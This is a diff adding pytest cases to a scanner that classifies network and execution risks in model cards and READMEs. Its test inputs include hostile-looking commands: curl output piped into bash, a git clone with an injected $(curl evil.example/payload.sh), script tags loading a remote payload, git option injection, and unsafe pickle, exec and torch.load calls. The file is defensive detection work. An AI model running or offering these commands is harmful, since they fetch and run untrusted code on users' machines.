+def test_text_scanner_possible_misuse_prose_does_not_hide_actionable_cc_content(tmp_path: Path, content: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, content, "cc_pattern")
+
+
+def test_text_scanner_arxiv_identifier_is_not_a_telnet_port(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    result = _scan_text_content(text_path, "---\ntags:\n- arxiv:2310.06825\n---\n# Model card\n")
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(check.details.get("type") == "suspicious_port" for check in result.checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize("later_port", [False, True])
+def test_text_scanner_port_retarget_skips_longer_numbers(tmp_path: Path, later_port: bool) -> None:
+    content = 'SSH uses port 23.\nendpoint = "arxiv:2310.06825"\n'
+    if later_port:
+        content += "endpoint = 'host:23'\n"
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("type") == "suspicious_port"]
+    assert checks
+    assert all(
+        check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        if later_port
+        else check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    if later_port:
+        assert checks[0].details["position"] == (tmp_path / "README.md").read_bytes().rindex(b"23")
+
+
+@pytest.mark.parametrize("newline", [b"\n", b"\r\n"], ids=["lf", "crlf"])
+@pytest.mark.parametrize("later_endpoint", [False, True])
+def test_port_findings_skip_css_and_timestamp_fields(tmp_path: Path, later_endpoint: bool, newline: bytes) -> None:
+    lines = [b'<td style="width:22%; font-size:23.5px">example</td>', b'updated = "2025-11-14T19:48:22Z"']
+    if later_endpoint:
+        lines.append(b'endpoint = "ssh://server:22"')
+    text_path = tmp_path / "README.md"
+    text_path.write_bytes(newline.join(lines) + newline)
+
+    result = TextScanner().scan(str(text_path))
+    checks = [check for check in result.checks if check.details.get("type") == "suspicious_port"]
+    if later_endpoint:
+        assert [(check.details["position"], check.severity) for check in checks] == [
+            (text_path.read_bytes().rindex(b"22"), IssueSeverity.WARNING)
+        ]
+    else:
+        assert not checks
+
+
+def test_text_scanner_port_retarget_exact_budget_ignores_longer_numbers() -> None:
+    payload = b'SSH uses port 23.\nendpoint = "arxiv:2310.06825"\n'
+    finding = {"type": "suspicious_port", "port": 23, "position": payload.index(b"23"), "severity": "MEDIUM"}
+    _classified, incomplete, remaining = TextScanner._retarget_documentation_finding(
+        payload, payload.lower(), finding, remaining_occurrences=1, allow_exhaustion_probe=True
+    )
+    assert incomplete is False
+    assert remaining == 0
+
+
+def test_text_scanner_port_retarget_includes_earlier_pattern_variants(tmp_path: Path) -> None:
+    content = 'endpoint = "port=23"\nReference host:23 is documented.\n'
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "suspicious_port"
+        and check.details.get("position") == content.index("23")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "Sources), miscellaneous (e.g. papers,\nnotes). See ",
+        "**Benchmarks:** HLE (Humanity's Last Exam) evaluates reasoning.\n\nSee ",
+        '```python\noutput = model(\n    "a multiline\nexample",\n)\n```\n\n* ',
+    ],
+)
+def test_text_scanner_documentation_links_after_prose_or_closed_examples_are_informational(
+    tmp_path: Path, prefix: str
+) -> None:
+    _assert_model_card_endpoint_informational(tmp_path, prefix + "[guide](https://docs.example.com/reference)\n")
+
+
+@pytest.mark.parametrize("contraction", ["It's", "Don't", "We're", "You've", "They'll", "I'd", "I'm", "Can't"])
+def test_text_scanner_contractions_before_parenthetical_links_are_informational(
+    tmp_path: Path, contraction: str
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, f"{contraction} (see [guide](https://docs.example.com/reference))\n"
+    )
+
+
+@pytest.mark.parametrize("contraction", ["It's", "Don't", "We're", "You've", "They'll", "I'd", "I'm", "Can't"])
+def test_text_scanner_contractions_inside_enclosing_calls_remain_actionable(tmp_path: Path, contraction: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f'download("{contraction} (see [payload](https://evil.example/payload.sh))")\n'
+    )
+
+
+@pytest.mark.parametrize("tag,attribute", [("img", "src"), ("a", "href")])
+def test_text_scanner_multiline_documentation_html_links_are_informational(
+    tmp_path: Path, tag: str, attribute: str
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, f'<{tag}\n    {attribute}="https://docs.example.com/reference"\n>\n'
+    )
+
+
+@pytest.mark.parametrize("tag,attribute", [("a", "href"), ("img", "src")])
+@pytest.mark.parametrize("prefix", ["<endpoint>\n", 'endpoint = "\n', "endpoint:\n", "download(\n"])
+def test_text_scanner_passive_html_in_config_remains_actionable(
+    tmp_path: Path, tag: str, attribute: str, prefix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + f'<{tag}\n    {attribute}="https://evil.example/payload.sh">\n'
+    )
+
+
+@pytest.mark.parametrize("newline", ["\n", "\r\n"])
+@pytest.mark.parametrize("tag,attribute", [("a", "href"), ("img", "src")])
+@pytest.mark.parametrize("open_assignment", [True, False])
+def test_text_scanner_passive_html_assignment_context_handles_line_endings(
+    tmp_path: Path, newline: str, tag: str, attribute: str, open_assignment: bool
+) -> None:
+    path = tmp_path / "model_card.md"
+    prefix = 'endpoint = "' if open_assignment else 'endpoint = "local"'
+    content = f'{prefix}\n<{tag}\n    {attribute}="https://docs.example.com/reference">\n'
+    path.write_bytes(content.replace("\n", newline).encode())
+
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+
+    assert checks
+    if open_assignment:
+        assert any(check.severity == IssueSeverity.WARNING for check in checks)
+    else:
+        assert all(check.severity == IssueSeverity.INFO for check in checks)
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+    assert determine_exit_code(aggregate) == int(open_assignment)
+
+
+@pytest.mark.parametrize("tag,attribute", [("a", "href"), ("img", "src")])
+def test_text_scanner_passive_html_after_closed_config_is_informational(
+    tmp_path: Path, tag: str, attribute: str
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, "<endpoint>local</endpoint>\n" + f'<{tag}\n    {attribute}="https://docs.example.com/reference">\n'
+    )
+
+
+@pytest.mark.parametrize("tag,attribute", [("script", "src"), ("iframe", "src"), ("link", "href")])
+def test_text_scanner_multiline_executable_html_urls_remain_actionable(
+    tmp_path: Path, tag: str, attribute: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f'<{tag}\n    {attribute}="https://evil.example/payload.sh"\n>\n'
+    )
 
 
 def test_text_scanner_backdoor_indicator_assignment_remains_actionable(tmp_path: Path) -> None:
@@ -5032,6 +6565,851 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
     assert determine_exit_code(aggregate) == 1
 
 
+@pytest.mark.parametrize("crlf", [False, True])
+@pytest.mark.parametrize(
+    "content",
+    [
+        "```bash\ngit clone https://github.com/ggml-org/llama.cpp.git  # build locally\n"
+        "# git clone --branch support https://github.com/example/llama.cpp.git\n"
+        "cd llama.cpp\ncmake -B build -DGGML_CUDA=ON\ncmake --build build --config Release -j\n```\n",
+        "```shell\nconda create -n demo python=3.12\nconda activate demo\n"
+        "git clone https://github.com/example/model.git\ncd model\npip install -e .\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git repo\n```\n",
+        "```console\ngit clone https://github.com/owner/repo.git\n```\n",
+        "```terminal\n$ git clone https://github.com/owner/repo.git\n```\n",
+        "```bash\ngit clone --depth 1 https://github.com/owner/repo.git ./models/repo\n```\n",
+        "```bash\ngit clone --depth=1 https://github.com/owner/repo.git\n```\n",
+        "```bash\ngit clone -- https://github.com/owner/repo.git\n```\n",
+        "> ```bash\n> git clone https://github.com/owner/repo.git\n> ```\n",
+        "> > ```bash\n> > git clone https://github.com/owner/repo.git\n> > ```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git # clone into $HOME\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git # examples: $(pwd), `pwd`, pipes | and ;\n```\n",
+        "```bash\ngit clone --branch=release --depth=1 -- https://github.com/owner/repo.git repo\n```\n",
+        "```bash\npip install --extra-index-url=https://download.pytorch.org/whl/ torch\n```\n",
+        "```bash\npython -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3.12 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git\ncmake -B build -DAPP_INCLUDE_TESTS=ON\n```\n",
+        "```bash\nuv pip install --pre vllm==0.10.1+gptoss \\\n"
+        "  --extra-index-url https://wheels.vllm.ai/gpt-oss/ \\\n"
+        "  --extra-index-url https://download.pytorch.org/whl/nightly/cu128 \\\n"
+        "  --index-strategy unsafe-best-match\nvllm serve openai/gpt-oss-20b\n```\n",
+        '```python\nfrom openai import OpenAI\nclient = OpenAI(\nbase_url="http://localhost:8000/v1",\napi_key="EMPTY",\n)\n```\n',
+        '```\nfrom openai import OpenAI\nclient = OpenAI(base_url="http://localhost:8000/v1", api_key="dummy")\n```\n',
+        '```\n# client setup\nimport openai\nclient = openai.OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        '~~~py\nclient = OpenAI(base_url="http://127.0.0.1:8001/v1/")\n~~~\n',
+        '```python\nclient = OpenAI(base_url="http://[::1]:8000/v1")\n```\n',
+        '> ```python\n> client = OpenAI(base_url="http://localhost:8000/v1")\n> ```\n',
+        '```python\nsystem = "You are helpful"\nclient = OpenAI(base_url="http://localhost:8000/v1")\n'
+        'messages = [{"role": "system", "content": system}]\n```\n',
+        '```python\nclient = OpenAI(base_url=os.getenv("OPENAI_BASE_URL", "http://localhost:8000/v1"))\n```\n',
+        '```python\nllm_cfg = {"model": "demo", "model_server": "http://localhost:8000/v1", "api_key": "EMPTY"}\n```\n',
+        '```python\nmessages = [{"role": "user", "content": '
+        '"https://qwenlm.github.io/blog/ Introduce Qwen developments"}]\n'
+        "for response in bot.run(messages=messages):\n    pass\n```\n",
+    ],
+)
+def test_routine_documented_examples_are_informational(tmp_path: Path, content: str, crlf: bool) -> None:
+    path = tmp_path / "model_card.md"
+    path.write_bytes((content.replace("\n", "\r\n") if crlf else content).encode())
+    result = TextScanner().scan(str(path))
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+def test_documented_sql_like_domains_are_informational(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    sql = (
+        "SELECT\n"
+        "    SUM(CASE WHEN email ILIKE '%@example.net%' THEN 1 ELSE 0 END)::FLOAT / "
+        "NULLIF(SUM(CASE WHEN email NOT ILIKE '%@example.net%' THEN 1 ELSE 0 END), 0) AS ratio\n"
+        "FROM contacts;\n"
+    )
+    result = _scan_text_content(path, f"~~~sql\n{sql}~~~\n\nThe examples use example.net.\n")
+    checks = _failed_network_detection_checks(result)
+    assert any(
+        check.details.get("domain") == "example.net" and check.severity == IssueSeverity.INFO for check in checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    ("query", "active"),
+    [
+        ("SELECT 1;\n  -- see publisher.dev for more information", False),
+        ("SELECT 1; -- See publisher.dev for documentation.", False),
+        ("SELECT 'it''s a literal'; -- See publisher.dev for documentation.", False),
+        ("SELECT concat(' -- publisher.dev for documentation', 'other');", True),
+        ("SELECT q'[first quote' -- publisher.dev]' FROM dual;", True),
+        (r"SELECT 'first quote\' -- publisher.dev';", True),
+        ("SELECT 1; -- publisher.dev\nSELECT dblink('host=publisher.dev', 'SELECT 1');", True),
+        ("-- see publisher.dev\nSELECT dblink('host=publisher.dev', 'SELECT 1');", True),
+        ("SELECT custom_function('first line\n-- publisher.dev\nlast line');", True),
+    ],
+)
+def test_documented_domain_retargets_past_sql_comments(tmp_path: Path, query: str, active: bool) -> None:
+    source = f"Converted by **Sample Team** - contact@publisher.dev\n\n~~~sql\n{query}\n~~~\n".encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(source)
+    expected_position = source.rindex(b"publisher.dev") if active else source.index(b"publisher.dev")
+    assert any(
+        check.details.get("domain") == "publisher.dev"
+        and check.details.get("position") == expected_position
+        and check.severity == (IssueSeverity.WARNING if active else IssueSeverity.INFO)
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+def test_truncated_document_keeps_sql_domain_and_coverage_warning(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    prefix = "~~~sql\nSELECT\n    SUM(CASE WHEN email LIKE '%@example.net%' THEN 1 ELSE 0 END);\n~~~\n"
+    path.write_bytes((prefix + "~~~sql\nSELECT\n    dblink('host=example.net', 'SELECT 1');\n~~~\n").encode())
+    result = TextScanner(config={"text_content_scan_bytes": len(prefix)}).scan(str(path))
+    assert any(
+        check.severity == IssueSeverity.WARNING and check.details.get("domain") == "example.net"
+        for check in _failed_network_detection_checks(result)
+    )
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert any("truncated at configured limit" in check.message for check in result.checks)
+
+
+@pytest.mark.parametrize("relative_path", ["example.net.csv", "data/example.net"])
+def test_documented_sql_domain_keeps_its_position_before_local_filenames(tmp_path: Path, relative_path: str) -> None:
+    path = tmp_path / "README.md"
+    content = (
+        "~~~sql\nSELECT email LIKE '%@example.net%';\n~~~\n"
+        f"~~~python\npd.read_csv({str(tmp_path / relative_path)!r})\n~~~\n"
+    ).encode()
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("domain") == "example.net"
+        and check.details.get("position") == content.index(b"example.net")
+        and check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    ("authority", "host"),
+    [
+        ("api.example.net", "api.example.net"),
+        ("archive-example.net", "archive-example.net"),
+        ("notexample.net", "notexample.net"),
+        ("example.net@other.org", "other.org"),
+    ],
+)
+def test_documented_sql_domain_is_distinct_from_active_hostnames(tmp_path: Path, authority: str, host: str) -> None:
+    path = tmp_path / "README.md"
+    content = (
+        f"~~~sql\nSELECT email LIKE '%@example.net%';\n~~~\n~~~python\nrequests.get('https://{authority}/v1')\n~~~\n"
+    ).encode()
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    observed = {
+        (detail["domain"], detail["position"], check.severity)
+        for check in checks
+        for detail in [check.details, *check.details.get("deduplicated_related_findings", [])]
+        if detail.get("type") == "domain_name"
+    }
+    assert {(offset, severity) for domain, offset, severity in observed if domain == "example.net"} == {
+        (content.index(b"example.net"), IssueSeverity.INFO)
+    }
+    assert any(
+        domain == host
+        and offset == content.rindex(host.encode())
+        and severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for domain, offset, severity in observed
+    )
+
+
+@pytest.mark.parametrize(
+    "use",
+    [
+        "dblink('host=example.net', 'SELECT 1');\n~~~",
+        "1;\nSELECT dblink('host=example.net', 'SELECT 1');\n~~~",
+        "1;\nSELECT custom_function('example.net');\n~~~",
+        "1;\n~~~\n~~~sql\nSELECT custom_function('example.net');\n~~~",
+        "http_get('https://example.net');\n~~~",
+        "1;\n~~~\n~~~python\nrequests.get('https://example.net:8443/v1')\n~~~",
+        "1;\n~~~\n~~~python\nrequests.get('https://some@example.net:8443/v1')\n~~~",
+        "1;\n~~~\n~~~python\nfetch(['https://example.net/v1'])\n~~~",
+    ],
+)
+def test_documented_sql_like_preserves_repeated_connector_domain(tmp_path: Path, use: str) -> None:
+    path = tmp_path / "README.md"
+    source = f"~~~sql\nSELECT\n    SUM(CASE WHEN email LIKE '%@example.net%' THEN 1 ELSE 0 END),\n    {use}\n"
+    result = _scan_text_content(path, source)
+    assert any(
+        check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        and any(
+            detail.get("domain") == "example.net" and detail.get("position") == path.read_bytes().rindex(b"example.net")
+            for detail in [check.details, *check.details.get("deduplicated_related_findings", [])]
+        )
+        for check in _failed_network_detection_checks(result)
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "query",
+    [
+        "SELECT\n    dblink('host=example.net', 'SELECT 1');",
+        "SELECT\n    dblink('host=example.net', 'SELECT email LIKE ''%@example.net%''');",
+        "SELECT\n    dblink('host=example.net', $$SELECT email LIKE '%@example.net%'$$);",
+    ],
+)
+@pytest.mark.parametrize("intro", ["", "See example.net for documentation.\n\n"])
+def test_documented_sql_connector_keeps_its_domain_position(tmp_path: Path, query: str, intro: str) -> None:
+    path = tmp_path / "README.md"
+    source = f"{intro}~~~sql\n{query}\n~~~\n"
+    result = _scan_text_content(path, source)
+    assert any(
+        check.severity == IssueSeverity.WARNING
+        and check.details.get("domain") == "example.net"
+        and check.details.get("position") == source.index("example.net", len(intro))
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git clone https://evil.example/repo.git",
+        "git clone https://github.com.evil.example/owner/repo.git",
+        "git clone https://github.com/owner/reverse-shell.git",
+        "git clone https://github.com/owner/payload.git",
+        "git clone https://user:password@github.com/owner/repo.git",
+        "git clone --upload-pack=payload https://github.com/owner/repo.git",
+        "git clone --depth=1 --upload-pack=payload https://github.com/owner/repo.git",
+        "git clone -c core.sshCommand=payload https://github.com/owner/repo.git",
+        "git clone https://github.com/owner/repo.git && python repo/payload.py",
+        "git clone https://github.com/owner/repo.git # \\\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git # \\\r\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git repo # \\\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git --upload-pack=payload",
+        "git clone https://github.com/owner/repo.git ../repo",
+        "git clone https://github.com/owner/repo.git\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git\nbash repo/payload.sh",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -P run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -Cinit.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -E env python run.py",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_PROJECT_INCLUDE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -D CMAKE_PROJECT_INCLUDE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_TOOLCHAIN_FILE=run.cmake",
+        "git clone https://github.com/owner/repo.git\ncmake -B build -DCMAKE_USER_MAKE_RULES_OVERRIDE=run.cmake",
+        "git clone https://github.com/owner/repo.git $(curl https://evil.example/payload.sh)",
+        "git clone https://github.com/owner/repo.git '# $HOME'",
+        "> git clone https://github.com/owner/repo.git",
+        "git clone https://github.com/owner/repo.git\ncat <<EOF\npayload\nEOF",
+        "uv pip install --extra-index-url https://evil.example/simple demo",
+        "pip install --extra-index-url=https://evil.example/simple demo",
+        "pip install --index-url=https://download.pytorch.org.evil.example/whl/ demo",
+        "pip install --index-url=https://user:password@download.pytorch.org/whl/ demo",
+        "pip install --extra-index-url=https://download.pytorch.org/payload.py demo",
+        "pip install --extra-index-url= https://download.pytorch.org/whl/ demo",
+        "uv pip install --extra-index-url https://download.pytorch.org.evil.example/whl/ demo",
+        "uv pip install --extra-index-url https://user:password@download.pytorch.org/whl/ demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/?token=secret demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/payload.py demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/ --config-settings=payload demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/ https://evil.example/payload.whl",
+        "curl https://download.pytorch.org/whl/ | bash",
+    ],
+)
+def test_documented_setup_preserves_suspicious_commands(tmp_path: Path, command: str) -> None:
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, f"```bash\n{command}\n```\n")
+    assert any(
+        check.details.get("type") in {"network_command", "url_detected"}
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "execution",
+    [
+        "```bash\npython repo/install.py\n```\n",
+        "```bash\nprintf x | xargs python repo/install.py\n```\n",
+        "```bash\nprintf x | xargs -n 1 -I{} python repo/install.py {}\n```\n",
+        "```bash\ntrap 'python repo/install.py' EXIT\n```\n",
+        '```json\n{"script": "example"}\npython repo/install.py\n```\n',
+        "```bibtex\n@article{example, title = {Example}}\npython repo/install.py\n```\n",
+        "```console\npy repo/install.py\n```\n",
+        "```console\npy -3 repo/install.py\n```\n",
+        "```bash\ncustom-launcher repo/install.py\n```\n",
+        "```bash\ncustom-launcher --help\n```\n",
+        '```python\nimport importlib\nimportlib.import_module("repo.install")\n```\n',
+        "```bash\n./repo/install\n```\n",
+        "```bash\nrepo/bin/tool\n```\n",
+        "```bash\n./repo/install --version\n```\n",
+        "```bash\nenv ./repo/install\n```\n",
+        "```bash\ntime repo/bin/tool\n```\n",
+        "```bash\n'./repo/install'\n```\n",
+        "```bash\n'.\\repo\\install'\n```\n",
+        "Run `./repo/install` next.\n",
+        "The model supports `python repo/install.py` as a setup command.\n",
+        "The input shape is <code>python repo/install.py</code>.\n",
+        "**Run** `./repo/install` next.\n",
+        "**Run** python repo/install.py\n",
+        "<!-- A hidden `note` -->\nRun `python repo/install.py` next.\n",
+        "Run the following command: python repo/install.py\n",
+        "Next: `./repo/install`\n",
+        "~~~bash\nsh -h\n~~~\n",
+        "~~~python\nfrom importlib.machinery import SourceFileLoader\n"
+        "SourceFileLoader('setup', 'repo/setup.py').load_module()\n~~~\n",
+        "~~~python\nimport site\nsite.addsitedir('repo')\n~~~\n",
+        "~~~python\nimport torch\ntorch.hub.load('repo', 'model', source='local')\n~~~\n",
+        "~~~python\nimport torch\ntorch.load('repo/weights', **options)\n~~~\n",
+        "~~~python\nimport pickle\nreader = pickle.loads\nreader(data)\n~~~\n",
+        "~~~python\nimport cloudpickle\ncloudpickle.load(stream)\n~~~\n",
+        "~~~python\nimport _pickle\n_pickle.loads(data)\n~~~\n",
+        "~~~python\nimport pickle as p\n~~~\n~~~python\np.loads(data)\n~~~\n",
+        "Run repo/bin/tool next.\n",
+        "<pre><code>./repo/install</code></pre>\n",
+        '```bash\necho "$(python repo/install.py)"\n```\n',
+        '```bash\necho "\\\\$(python repo/install.py)"\n```\n',
+        "```bash\npy\\\nthon repo/install.py\n```\n",
+        "```bash\npy\\\r\nthon repo/install.py\n```\n",
+        '```bash\necho "$(py\\\nthon repo/install.py)"\n```\n',
+        '```python\nfrom subprocess import call\ncall(["python", "repo/install.py"])\n```\n',
+        '```python\nfrom subprocess import Popen as launch\nlaunch(["python", "repo/install.py"])\n```\n',
+        "```bash\ncat <<'EOF'\npython repo/install.py\nEOF\npython repo/install.py\n```\n",
+        "```bash\ncat <<'EOF'\npython repo/install.py\n```\n",
+        "```bash\nbash <<'EOF'\npython repo/install.py\nEOF\n```\n",
+        "```bash\necho foo#bar; python repo/install.py\n```\n",
+        "```bash\npython${IFS}-m${IFS}repo.install\n```\n",
+        "```bash\n> output.log python repo/install.py\n```\n",
+        "```bash\n{log}> output.log python repo/install.py\n```\n",
+        "```bash\nif python repo/install.py; then :; fi\n```\n",
+        "```bash\nwhile python repo/install.py; do :; done\n```\n",
+        "```bash\nuntil python repo/install.py; do :; done\n```\n",
+        "```bash\ntime python repo/install.py\n```\n",
+        "```bash\ntime -p python repo/install.py\n```\n",
+        "```bash\n{ python repo/install.py; }\n```\n",
+        "```bash\n>output.log python repo/install.py\n```\n",
+        "```bash\n2> output.log python repo/install.py\n```\n",
+        "```bash\n2>>output.log python repo/install.py\n```\n",
+        "```bash\n<input.txt python repo/install.py\n```\n",
+        "```bash\nenv >output.log python repo/install.py\n```\n",
+        "```console\n./repo/install.exe\n```\n",
+        "```bash\n./repo/install.exe --help\n```\n",
+        "```console\n./repo/install.EXE\n```\n",
+        "```console\n./repo/install.com\n```\n",
+        '```python\nfrom ctypes import CDLL\nCDLL("./repo/plugin.so")\n```\n',
+        '```python\nfrom ctypes import CDLL as load\nload("./repo/plugin.so")\n```\n',
+        '```python\nimport ctypes as c\nc.CDLL("./repo/plugin.so")\n```\n',
+        '```python\nfrom ctypes import cdll\ncdll.LoadLibrary("./repo/plugin.so")\n```\n',
+        '```python\nfrom cffi import FFI\nFFI().dlopen("./repo/plugin.so")\n```\n',
+        "```console\n$ python${IFS}-m${IFS}repo.install\n```\n",
+        "```bash\nvllm serve ./repo --trust-remote-code\n```\n",
+        "```bash\nvllm serve ./repo --trust-remote-code=true\n```\n",
+        "```bash\nvllm serve ./repo --middleware repo.install\n```\n",
+        "```bash\nvllm serve ./repo --tool-parser-plugin repo/install.py\n```\n",
+        "```bash\nvllm serve ./repo --unrecognized-option value\n```\n",
+        '```python\nimport os\nos.execv("./repo/install.py", ["install.py"])\n```\n',
+        '```python\nfrom os import execv as launch\nlaunch("./repo/install.py", ["install.py"])\n```\n',
+        '```python\nimport os\nos.posix_spawn("./repo/install.py", ["install.py"], {})\n```\n',
+        '```python\nimport pickle\npickle.load(open("repo/model.pkl", "rb"))\n```\n',
+        '```python\nimport pickle\npickle.Unpickler(open("repo/model.pkl", "rb")).load()\n```\n',
+        "```python\nfrom pickle import Unpickler as Loader\nloader = Loader(stream)\nloader.load()\n```\n",
+        '```python\nimport builtins\ngetattr(builtins, "exec")(open("repo/install.py").read())\n```\n',
+        '```python\nimport builtins\nlaunch = getattr(builtins, "exec")\nlaunch(source)\n```\n',
+        '```python\n__builtins__["exec"](source)\n```\n',
+        '```python\nlaunch = __builtins__["exec"]\nlaunch(source)\n```\n',
+        "```python\nimport pickle as p\np.loads(data)\n```\n",
+        "```python\nfrom pickle import load as deserialize\ndeserialize(stream)\n```\n",
+        '```python\nimport torch\ntorch.load("repo/model.pt", weights_only=False)\n```\n',
+        '```python\nfrom torch import load as deserialize\ndeserialize("repo/model.pt", weights_only=False)\n```\n',
+        "```\npython repo/install.py\n```\n",
+        "```\nrepo/install.py --help\n```\n",
+        "```console\n$ python repo/install.py\n```\n",
+        "```terminal\n$ python3 repo/install.py\n```\n",
+        "```powershell\n& ./repo/install.ps1\n```\n",
+        "```javascript\nrequire('child_process').execFileSync('node', ['repo/install.js']);\n```\n",
+        "```ruby\nload './repo/install.rb'\n```\n",
+        "```powershell title=setup\n& ./repo/install.ps1\n```\n",
+        "```powershell title=setup\n& ./repo/install.ps1\n",
+        "    python repo/install.py\n",
+        "\tpython repo/install.py\n",
+        "    import runpy\n\n    runpy.run_path('repo/install.py')\n",
+        "Run `python repo/install.py` next.\n",
+        "Run ``python repo/install.py`` next.\n",
+        "Run `python\nrepo/install.py` next.\n",
+        "Run `./repo/install.py` next.\n",
+        "Then use `runpy.run_path('repo/install.py')`.\n",
+        "An unmatched `` marker. Run `python repo/install.py` next.\n",
+        "Escaped \\` marker. Run `python repo/install.py` next.\n",
+        "Escaped \\``python repo/install.py` next.\n",
+        "<pre><code>python repo/install.py</code></pre>\n",
+        "<PRE class='shell'><CODE>python repo/install.py</CODE></PRE>\n",
+        "<pre>python&#32;repo/install.py</pre>\n",
+        "<pre><code><span>python</span> repo/install.py</code></pre>\n",
+        "<pre><code>cd repo<br>python install.py</code></pre>\n",
+        "<pre><code class='language-ruby'>load './repo/install.rb'</code></pre>\n",
+        "<pre><code>python repo/install.py\n",
+        "Run <code>python repo/install.py</code> next.\n",
+        "Run <code>./repo/install.py</code> next.\n",
+        "Run python repo/install.py next.\n",
+        "Run: python repo/install.py next.\n",
+        "Run:python repo/install.py next.\n",
+        "Run: `./repo/install.py` next.\n",
+        "Run: <code>./repo/install.py</code> next.\n",
+        "Run`./repo/install.py` next.\n",
+        "Run<code>./repo/install.py</code> next.\n",
+        "Run — python repo/install.py next.\n",
+        "Execute:\npython repo/install.py next.\n",
+        "Run the following command:\npython repo/install.py\n",
+        "Run the following command:\n\npython repo/install.py\n",
+        "Run the following command:\r\npython repo/install.py\r\n",
+        "Run the following command\npython repo/install.py\n",
+        ">     python repo/install.py\n",
+        "> >     python repo/install.py\n",
+        "> ```bash\n> python repo/install.py\n> ```\n",
+        "> ```bash\n> python repo/install.py\n",
+        "Next, execute bash repo/install.sh to finish setup.\n",
+        "Launch ./repo/install.py next.\n",
+        'Run "python" repo/install.py next.\n',
+        "Run python repo/install.py when you're ready.\n",
+        "<p>Run <b>python</b> repo/install.py next.</p>\n",
+        "<p>Run</p><p>python repo/install.py</p>\n",
+        "Run<br>python repo/install.py\n",
+        "Run runpy.run_path('repo/install.py') next.\n",
+        "```bash\n./repo/install.sh\n```\n",
+        "```bash\n./repo/install.py --help\n```\n",
+        "```bash\nexec -a installer python repo/install.py\n```\n",
+        "```bash\npython3 -m repo.install\n```\n",
+        "```bash\nPython.exe repo/install.py\n```\n",
+        "```bash\npython3 \\\n repo/install.py\n```\n",
+        '```bash\n"python3" repo/install.py\n```\n',
+        '```bash\npyt""hon3 repo/install.py\n```\n',
+        "```bash\nenv MODE=setup python3 repo/install.py\n```\n",
+        "```bash\ncd repo && bash install.sh\n```\n",
+        "```bash\nuv run repo/install.py\n```\n",
+        "```bash\neval 'python repo/install.py'\n```\n",
+        "```bash\necho `python repo/install.py`\n```\n",
